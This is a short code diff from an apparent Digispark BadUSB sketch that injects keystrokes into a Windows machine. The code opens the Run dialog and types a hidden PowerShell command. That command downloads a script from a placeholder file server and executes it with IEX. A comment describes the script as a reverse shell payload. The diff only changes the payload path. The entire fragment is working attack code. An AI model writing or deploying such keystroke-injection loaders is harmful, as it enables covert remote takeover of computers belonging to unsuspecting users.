@@ -26,7 +26,7 @@ void loop() {
     /* Download Reverse Shell Payload */
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     DigiKeyboard.delay(750);
-    DigiKeyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('[FILESERVER]/payloads/payload.ps1');\""); // Download payload from fileserver and execute.
+    DigiKeyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('[FILE_SERVER]/payload.ps1');\""); // Download payload from fileserver and execute.
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(2000);
 
